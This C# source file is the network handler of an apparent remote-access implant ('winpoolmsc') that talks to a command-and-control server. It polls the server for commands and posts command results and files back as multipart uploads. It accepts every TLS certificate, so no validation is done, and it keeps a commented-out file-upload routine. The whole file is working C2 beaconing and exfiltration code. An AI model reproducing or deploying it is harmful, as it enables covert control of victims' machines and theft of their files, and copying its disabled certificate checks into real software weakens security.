using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using Flurl.Http;
using Newtonsoft.Json;

namespace winpoolmsc
{
    internal class NetHandler
    {
        Server c2;

        public NetHandler(Server server)
        {
            c2 = server;
        }

        public async Task<string> AskCommand()
        {
            var handler = new HttpClientHandler();
            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback =
                (httpRequestMessage, cert, cetChain, policyErrors) =>
                {
                    return true;
                };

            var client = new HttpClient(handler);
            string command = "";
            try
            {
                var response = await client.GetAsync($"https://{c2.Hostname}:{c2.Port}/command");
                command = await response.Content.ReadAsStringAsync();
            } catch(Exception ex) {
                Console.WriteLine(ex.Message);
            }

            return command;
        }

        public async Task<string> SendCommandResult(int cmNb, string? data, string? fileStream) 
        {
            var handler = new HttpClientHandler();
            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback =
                (httpRequestMessage, cert, cetChain, policyErrors) =>
                {
                    return true;
                };

            HttpContent dataString = new StringContent("error");
            try
            {
               dataString = new StringContent(data, UnicodeEncoding.UTF8, "application/json");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            //HttpContent? fileStreamContent = null;
            if (fileStream != null)
            {
                return await $"https://{c2.Hostname}/command/{cmNb}".PostMultipartAsync(mp => {
                    mp.AddJson("json", data);
                    mp.Headers.ContentType.MediaType = "multipart/form-data";
                    mp.AddFile("fichier", fileStream);
                }).ReceiveString();

            } else {
                return await $"https://{c2.Hostname}/command/{cmNb}".PostMultipartAsync(mp => {
                    mp.AddJson("json", data);
                    mp.Headers.ContentType.MediaType = "multipart/form-data";
                }).ReceiveString();
            }

        }

        internal void Ping()
        {
            Ping pingSender = new Ping();
            PingOptions options = new PingOptions();

            // Use the default Ttl value which is 128,
            // but change the fragmentation behavior.
            options.DontFragment = true;

            // Create a buffer of 32 bytes of data to be transmitted.
            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            byte[] buffer = Encoding.ASCII.GetBytes(data);
            int timeout = 120;
            PingReply reply = pingSender.Send(c2.Address, timeout, buffer, options) ;
            if (reply.Status == IPStatus.Success)
            {
                Console.WriteLine("Address: {0}", reply.Address.ToString());
                Console.WriteLine("RoundTrip time: {0}", reply.RoundtripTime);
                Console.WriteLine("Status: {0}", reply.Status);
            }

        }

        /*internal async Task<System.IO.Stream> UploadFile(Stream paramFileStream, byte[] paramFileBytes)
        {
            //HttpContent stringContent = new StringContent(paramString);
            HttpContent fileStreamContent = new StreamContent(paramFileStream);
            HttpContent bytesContent = new ByteArrayContent(paramFileBytes);
            using (var client = new HttpClient())
            using (var formData = new MultipartFormDataContent())
            {
                formData.Add(stringContent, "param1", "param1");
                formData.Add(fileStreamContent, "file1", "file1");
                formData.Add(bytesContent, "file2", "file2");
                var response = await client.PostAsync($"https://{c2.Address}/command/3", formData);
                if (!response.IsSuccessStatusCode)
                {
                    return null;
                }
                return await response.Content.ReadAsStreamAsync();
            }
        }*/
    }
}
